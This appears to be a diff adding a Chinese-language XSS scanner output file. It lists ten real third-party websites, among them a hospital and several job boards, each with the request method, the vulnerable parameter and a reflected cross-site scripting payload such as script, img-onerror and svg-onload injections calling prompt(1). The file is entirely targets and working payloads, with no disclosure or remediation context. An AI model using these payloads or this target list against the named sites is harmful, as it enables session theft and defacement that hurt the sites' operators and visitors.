@@ -1,0 +1,49 @@
+检测网址 : http://wenda.tianya.cn/expert.jsp?activityId=1bg8a8bls0u9d0ame8q63rl011ec5bp7dchkh
+提交方式 : GET
+漏洞参数 : activityId
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://www.wforder.com//about/?id=1
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://www.o-hr.cn//jobs/search?category=10213
+提交方式 : GET
+漏洞参数 : category
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://www.gxhospital.com/visit.asp?did=85
+提交方式 : GET
+漏洞参数 : did
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://hr.seentao.com/platform/scrp/?from=XHSN
+提交方式 : GET
+漏洞参数 : from
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://hr.seentao.com/platform/scrp/?from=%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : from
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://job.haofs.com/list.asp?str=%22%3E%3Csvg%2Fonload%3Dprompt%281%29%3E
+提交方式 : POST
+漏洞参数 : str
+攻击载荷 : "><svg/onload=prompt(1)>
+------------------------------------
+检测网址 : http://s.yjbys.com/?area=%B5%D8%C7%F8&keyword=%C7%B0%B6%CB
+提交方式 : GET
+漏洞参数 : keyword
+攻击载荷 : "><a href=javascript:prompt(1)>Clickme</a>
+------------------------------------
+检测网址 : http://www.wokew.com/ServiceList_V4.aspx?pd=1&fl=128&lx=&bz=&dq=
+提交方式 : GET
+漏洞参数 : fl
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://www.wokew.com/ServiceList_V4.aspx?pd=1&fl=128&lx=&bz=&dq=%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : dq
+攻击载荷 : </script>"><script>prompt(1)</script>
